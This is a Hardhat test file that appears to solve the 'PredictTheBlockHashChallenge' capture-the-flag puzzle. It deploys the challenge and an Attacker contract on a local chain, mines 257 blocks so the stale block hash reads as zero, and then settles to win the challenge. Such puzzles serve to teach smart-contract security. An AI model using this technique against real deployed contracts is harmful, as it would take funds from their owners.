import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers';
import { expect } from 'chai';
import { ethers } from 'hardhat';

import { Attacker, PredictTheBlockHashChallenge } from '../typechain-types';

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: PredictTheBlockHashChallenge;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = (await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({ value: ethers.parseEther('1') })) as unknown as PredictTheBlockHashChallenge;

    await target.waitForDeployment();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const AttackerFactory = await ethers.getContractFactory('Attacker');
    const attackerContract = (await AttackerFactory.deploy(target.getAddress(), {
      value: ethers.parseEther('1'),
    })) as unknown as Attacker;

    await attackerContract.waitForDeployment();

    await attackerContract.connect(attacker).attack();

    for (let i = 0; i < 257; i++) {
      await ethers.provider.send('evm_mine');
    }

    await attackerContract.connect(attacker).settle();

    expect(await target.isComplete()).to.equal(true);
  });
});
